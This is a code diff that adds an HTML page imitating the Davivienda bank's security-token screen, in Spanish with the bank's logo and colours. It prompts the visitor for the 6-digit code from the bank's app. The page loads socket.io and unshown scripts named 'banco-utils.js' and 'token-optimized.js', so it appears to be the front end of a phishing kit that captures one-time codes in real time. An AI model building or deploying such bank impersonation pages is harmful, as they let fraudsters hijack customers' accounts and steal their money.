@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Token de Seguridad</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to bottom, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 0;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 340px;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-section {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-section img {
+            height: 35px;
+            width: auto;
+        }
+
+        .content {
+            padding: 30px 25px;
+        }
+
+        .greeting {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .welcome-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 18px;
+            font-family: 'Poppins', sans-serif;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.3s;
+            letter-spacing: 8px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #ED1C24;
+        }
+
+        .token-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 8px;
+            line-height: 1.5;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background-color: #ED1C24;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            transition: background-color 0.3s, opacity 0.3s;
+            margin-bottom: 80px;
+            margin-top: 25px;
+        }
+
+        .btn-continue:hover:not(:disabled) {
+            background-color: #d01920;
+        }
+
+        .btn-continue:active:not(:disabled) {
+            background-color: #b01519;
+        }
+
+        .btn-continue:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .forgot-password {
+            text-align: center;
+            padding: 20px 25px;
+            background-color: #f8f8f8;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .forgot-password p {
+            font-size: 14px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                box-shadow: none;
+            }
+            
+            body {
+                padding-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <img src="img/logo-davivienda.png" alt="Davivienda">
+        </div>
+        
+        <div class="content">
+            <p class="greeting">¡Hola!</p>
+            <h1 class="welcome-text">Nos alegra que esté aquí</h1>
+            
+            <form id="tokenForm">
+                <div class="form-group">
+                    <label for="token">Ingrese su token de seguridad</label>
+                    <input type="text" id="token" name="token" placeholder="" maxlength="6" inputmode="numeric">
+                    <p class="token-info">Ingrese el código de 6 dígitos generado por su aplicación Davivienda</p>
+                </div>
+                
+                <button type="button" class="btn-continue" id="btnContinue" disabled>Continuar</button>
+            </form>
+        </div>
+        
+        <div class="forgot-password">
+            <p>¿Olvidó o bloqueó su clave?</p>
+        </div>
+    </div>
+
+    <!-- Overlay de carga -->
+    <div class="loading-overlay" id="loadingOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;z-index:9999;">
+        <div class="loading-content" style="text-align:center;">
+            <img src="img/logo-davivienda.png" alt="Davivienda" style="width:150px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
+        </div>
+    </div>
+    <style>
+        .loading-overlay.show,
+        .loading-overlay.active {
+            display: flex !important;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(0.95); }
+        }
+        .btn-continue.enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+    </style>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="token-optimized.js"></script>
+</body>
+</html>
